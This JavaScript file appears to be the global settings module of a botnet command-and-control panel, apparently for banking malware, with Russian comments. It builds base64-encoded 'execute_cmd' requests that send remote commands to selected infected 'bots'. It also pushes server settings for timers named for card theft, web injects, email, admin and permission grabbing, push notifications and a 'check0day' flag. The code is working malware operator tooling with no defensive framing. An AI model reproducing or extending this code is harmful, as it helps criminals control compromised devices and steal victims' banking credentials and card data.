import Cookies from 'js-cookie';
import { try_eval } from './serviceF';
import $ from 'jquery';
import { isNullOrUndefined } from 'util';
// Самый главный файл, глобальные функции и переменные, которые не перезаписываются до обновления страницы
Array.prototype.remove = function() { // надо эту парашу доделать, и в глобальные вывести
    var what, a = arguments, L = a.length, ax;
    while (L && this.length) {
        what = a[--L];
        while ((ax = this.indexOf(what)) !== -1) {
            this.splice(ax, 1);
        }
    }
    return this;
};
// Костыль, да и хуй с ним
let SettingsContext = {
    panelVersion: "1.5.1.0",
    firstLoad: false,
    autoUpdateDelay: 10000, // 10 секунд
    autoUpdateEnable: true,
    url_connect: Cookies.get('url_connect'),
    url_builder: Cookies.get('url_builder'),
    SelectedBots: [],
    BotsOnPage: [],
    BotsFilterMode: '000000000000',
    findID: '',
    findTAG: '',
    findAPP: '',
    BotsPerPage: '25',
    timeInject: 10,
    timeCC: 20,
    timeMail: 30,
    arrayUrl: '',
    pushTitle: '',
    admin_T: 50,
    permission_T: 70,
    pushText: '',
    timeProtect: '',
    AccessKey: '',
    BotsSelected() {
        if(this.SelectedBots.length != 0) {
            return true;
        }
     //   this.ShowToast("warning", "Please select bots");
        return false;
    },
    CurrentSetBot: '',
    NameApplication: '',
    start_modul: '',
    UpdateInjectsHash: '',
    UpdateInjectsTable() {
        this.UpdateInjectsHash = Math.random().toString();
    },
    UpdateTableHash: '',
    UpdateTable() {
        this.UpdateTableHash = Math.random().toString();
    },
    ShowToast(status, message) {
      //  try_eval('toastr["' + status + '"]("' + message + '")');
    },
    ShowToastTitle(status,title, message) {
     //   try_eval('toastr["' + status + '"]("' + message + '","' + title + '")');
    },
    BotSendCommandCallBack(command, callback) {
        if(!this.BotsSelected()) { // check selected bots
            return;
        }
        let botsList = '';
        this.SelectedBots.forEach(function(element) {
            botsList += element + ',';
        });
        let request = $.ajax({
            type: 'POST',
            url: SettingsContext.url_connect,
            data: {
                'params': new Buffer(
                    '{"sent_request":"execute_cmd","ID":"' + 
                    botsList.substring(0, botsList.length - 1) + 
                    '","command":"' + new Buffer(command).toString('base64') + 
                    '"}'
                ).toString('base64')
            }
        });
        
        request.done(function(msg) {
			try {
				let result = JSON.parse(msg);
				if(!isNullOrUndefined(result.error)) {
					SettingsContext.ShowToastTitle('error', 'ERROR', result.error);
				}
				else {
					if(isNullOrUndefined(callback)) {
						SettingsContext.ShowToastTitle('success', 'Info', result.message);
					}
					else {
						callback(result);
					}
				}
			
            }
            catch (ErrMgs) {
                SettingsContext.ShowToastTitle('error', 'ERROR', 'Error send bot command - ' + command + '. Look console for more details.');
                console.log('Error - ' + ErrMgs);
            }
        }.bind(this));
    },
    BotSendCommand(command) {
        this.BotSendCommandCallBack(command, null);
    },
    SaveSettingsCookies() {
        if(this.BotsPerPage=='') {
            this.BotsPerPage = '10';
        }
        Cookies.set('tick_update_panel', this.autoUpdateDelay);
        Cookies.set('count_page_clients', this.BotsPerPage);
        Cookies.set('filter_table', this.BotsFilterMode);
        Cookies.set('findID', this.findID);
        Cookies.set('findTAG', this.findTAG);
        Cookies.set('findAPP', this.findAPP);
        Cookies.set('url_connect', this.url_connect);
        Cookies.set('url_builder', this.url_builder);
    },
    SaveSettingsServer() {
        let request = $.ajax({
            type: 'POST',
            url: SettingsContext.url_connect,
            data: {
                'params': new Buffer(
                    '{"sent_request":"chenge_settings_main",' + 
                    '"cards_T":"' + this.timeCC + '",'+
                    '"injections_T":"' + this.timeInject + '",'+
                    '"email_T":"' + this.timeMail + '",'+
                    '"check0day":"null",'+
                    '"URLs":"' + this.arrayUrl + '",'+
                    '"protect_T":"' + this.timeProtect + '",' +
                    '"table_bots_update":"' + this.autoUpdateDelay + '",'+
                    '"title_p":"' + this.pushTitle + '",'+
                    '"pushconnect":"8.8.8.8",'+
                    '"ssh":"null",'+
                    '"admin_T":"'+ this.admin_T +'",' +
                    '"permission_T":"'+ this.permission_T +'",' +
                    '"text_p":"' + this.pushText + '"}'
                ).toString('base64')
            }
        });
        
        request.done(function(msg) {
            let result = JSON.parse(msg);
            if(!isNullOrUndefined(result.error)) {
                SettingsContext.ShowToastTitle('error', 'ERROR', result.error);
            }
            else {
                SettingsContext.ShowToastTitle('success', 'Info', result.message);
            }
        }.bind(this));
    }
};

function LoadConfigFile() {
    let request = $.ajax({
        type: 'GET',
        url: '/config.json'
    });

    request.done(function(jsondata) {
        try {
            SettingsContext.url_builder = jsondata.url_bulder;
            SettingsContext.url_connect = jsondata.url;
            SettingsContext.SaveSettingsCookies();
        }
        catch (err) {
           // console.log(err);
            SettingsContext.ShowToastTitle('error', 'ERROR', 'Error loading config file');
        }
    }.bind(this));
}

if(!SettingsContext.firstLoad)
{
    LoadConfigFile();
    SettingsContext.firstLoad = true;
    if(!isNullOrUndefined(Cookies.get('tick_update_panel'))) {
        let timeout = Cookies.get('tick_update_panel');
        if(timeout == 0) {
            SettingsContext.autoUpdateDelay = 0;
            SettingsContext.autoUpdateEnable = false;
        }
        else {
            SettingsContext.autoUpdateDelay = timeout;
            SettingsContext.autoUpdateEnable = true;
        }
    }
    if(!isNullOrUndefined(Cookies.get('count_page_clients'))) {
        SettingsContext.BotsPerPage = Cookies.get('count_page_clients');
    }
    if(!isNullOrUndefined(Cookies.get('filter_table'))) {
        SettingsContext.BotsFilterMode = Cookies.get('filter_table');
    }
    if(!isNullOrUndefined(Cookies.get('findID'))) {
        SettingsContext.findID = Cookies.get('findID');
    }
    if(!isNullOrUndefined(Cookies.get('findTAG'))) {
        SettingsContext.findTAG = Cookies.get('findTAG');
    }
    if(!isNullOrUndefined(Cookies.get('findAPP'))) {
        SettingsContext.findAPP = Cookies.get('findAPP');
    }
}

export default SettingsContext;
